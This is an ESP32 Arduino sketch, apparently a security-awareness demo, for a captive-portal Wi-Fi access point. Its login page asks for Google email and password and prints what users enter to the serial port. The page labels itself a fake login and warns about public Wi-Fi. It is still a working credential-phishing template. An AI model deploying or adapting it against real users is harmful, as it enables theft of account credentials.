#include <WiFi.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include "ESPAsyncWebServer.h"


// access point generato dall'esp
char *ssid_esp="test";
char *psw_esp="1234";


DNSServer dnsServer;
AsyncWebServer server(80);

String email;
String password;


const char index_html[] PROGMEM= R"rawliteral(
  <html>
    <head>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Login</title>
      </head>
    
    <body>
      <h1>GO AWAY, THIS IS A FAKE LOGIN!!!</h1>
      <p>Form used for debugging purpose.</p>
      <form action="/login">
        Your email Google : <input type="email" name="email"></input>
        Password : <input type="password" name="password"></input>
        <input type="submit">Login</input>
      </form>
    </body>
  </html>
)rawliteral";


class CaptiveRequestHandler : public AsyncWebHandler{
  public:
    CaptiveRequestHandler() {}
    virtual ~CaptiveRequestHandler() {}
    
    bool canHandle(AsyncWebServerRequest *request){
      return true; // gestisce tutte le richieste
    }
    void handleRequest(AsyncWebServerRequest *request){
      // questo fa in modo che il server rimandi immediatamente alla pagina iniziale
      request->send_P(200,"text/html",index_html);
    }
};


void setupServerPages(){
  

  // si setta il comportamento per ogni singola pagina
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *r){
    r->send_P(200,"text/html",index_html);
  });

  server.on("/login",HTTP_GET,[](AsyncWebServerRequest *r){
    String inputEmail="";
    String inputPassword="";

    if (r->hasParam("email")){
      inputEmail=r->getParam("email")->value();
    }
    if (r->hasParam("password")){
      inputPassword=r->getParam("password")->value();
    }

    Serial.println("USER DATA: "+ inputEmail+ " "+ inputPassword);

    r->send(200,"text/html",R"rawliteral(
      <html>
        Don't send your data in unsafe logins and public wifi...<br> 
        <a href="/">Turn back</a>
      </html>
      )rawliteral");
  });


  server.onNotFound([](AsyncWebServerRequest *r){
    r->redirect("/");
  });
}


void setESPLocalNetwork(char* ssid,char* psw,IPAddress accesspoint,IPAddress gateway,IPAddress subnet){

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(accesspoint,gateway,subnet);
  
  while (!WiFi.softAP(ssid,psw)){
    delay(750);
    Serial.println("...");
  }

  dnsServer.start(53, "*", WiFi.softAPIP());

  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  setupServerPages();
  server.begin();

  Serial.println("ESP router IP "+WiFi.softAPIP().toString());
}


void setup() {
  Serial.println("START");
  Serial.begin(115200);



  // setESPLocalNetwork(ssid_esp,psw_esp,IPAddress(8,8,8,8), IPAddress(8,8,8,8), IPAddress(255,255,255,0));
}

void loop() {
  // put your main code here, to run repeatedly:
  //dnsServer.processNextRequest();
}
